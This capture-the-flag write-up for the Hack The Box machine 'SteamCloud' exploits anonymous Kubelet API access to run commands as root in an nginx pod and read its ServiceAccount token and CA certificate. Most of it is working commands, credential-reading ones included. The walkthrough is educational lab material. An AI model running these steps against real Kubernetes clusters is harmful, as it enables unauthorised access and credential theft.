---
layout: writeup
title: "HTB SteamCloud"
date: 2026-04-28
description: "Easy Linux/Kubernetes box exploiting anonymous Kubelet API access for RCE inside a pod and extracting its ServiceAccount token to interact with the Kubernetes API."
tags: [Box, easy, linux, cloud]
---

## Reconnaissance

A full TCP port scan is performed against the target to identify all open ports.

```bash
nmap -p- --open -Pn -T4 --stats-every=5s 10.129.96.167 -oN basic_scan.txt
```

![open ports discovered by the full port scan](/assets/images/steamcloud/Pasted-image-20260428164218.png)
*Open ports identified on the target*

The open ports are extracted from the scan output for use in follow-up scans.

```bash
grep 'open' basic_scan.txt | awk '{print $1}' | cut -d'/' -f1 | paste -sd ','
```

Enumeration of the open ports indicates the host is a **Kubernetes node**.

## Enumeration

### Kubernetes API Server (8443)

Port 8443 hosts the Kubernetes API Server. Access without credentials is denied.

```bash
curl https://10.129.96.167:8443/ -k
```

```json
{
  "kind": "Status",
  "apiVersion": "v1",
  "metadata": {},
  "status": "Failure",
  "message": "forbidden: User \"system:anonymous\" cannot get path \"/\"",
  "reason": "Forbidden",
  "details": {},
  "code": 403
}
```

### Kubelet API (10250)

Port 10250 hosts the **Kubelet API**, an extension used by the Kubernetes node agent. Unlike the API server, this endpoint responds without authentication.

```bash
curl https://10.129.96.167:10250/pods -k
```

A response is returned, confirming anonymous access to the Kubelet API.

To audit the Kubelet API more effectively, [kubeletctl](https://github.com/cyberark/kubeletctl) is downloaded and installed.

```bash
curl -LO https://github.com/cyberark/kubeletctl/releases/download/v1.7/kubeletctl_linux_amd64 chmod a+x ./kubeletctl_linux_amd64 mv ./kubeletctl_linux_amd64 /usr/local/bin/kubeletctl
```

With this tool, the pods currently running on the node are enumerated.

```bash
kubeletctl pods --server 10.129.96.167
```

![pods running on the Kubernetes node](/assets/images/steamcloud/Pasted-image-20260428171553.png)
*Pods enumerated via kubeletctl*

One of the listed pods does not correspond to a standard Kubernetes component — it is an `nginx` pod. Because the Kubelet API allows anonymous access, the `run`, `exec`, and `cri` commands can potentially be used against pods on the node.

## Exploitation — Kubelet RCE

`kubeletctl` is used to scan for remote code execution capability against the discovered pods.

```bash
kubeletctl --server 10.129.96.167 scan rce
```

![RCE scan results against the Kubelet API](/assets/images/steamcloud/Pasted-image-20260428171710.png)
*Pods vulnerable to RCE via the Kubelet API*

Commands can be executed inside the `nginx` pod.

```bash
kubeletctl --server 10.129.96.167 exec "id" -p nginx -c nginx
```

The output shows the executing user is **root** inside the pod. This is because the pod runs under a **ServiceAccount**, and Kubernetes automatically mounts that ServiceAccount's credentials into the pod so it can authenticate against the cluster's API server.

> A ServiceAccount token mounted inside a pod is a cluster-scoped credential. If the pod's ServiceAccount has been granted excessive RBAC permissions, gaining code execution inside the pod can be equivalent to gaining significant access to the entire Kubernetes cluster.

These credentials are mounted at the default path:

```bash
/var/run/secrets/kubernetes.io/serviceaccount/
```

## Credential Extraction

The ServiceAccount's bearer token is retrieved.

```bash
kubeletctl --server 10.129.96.167 exec "cat /var/run/secrets/kubernetes.io/serviceaccount/token" -p nginx -c nginx
```

The cluster's CA certificate is also retrieved, which is required to validate TLS connections to the Kubernetes API server.

```bash
kubeletctl --server 10.129.96.167 exec "cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt" -p nginx -c nginx
```

With the bearer token and CA certificate, `kubectl` can now be used to authenticate against the Kubernetes API server and enumerate the cluster's resources, including the list of pods.
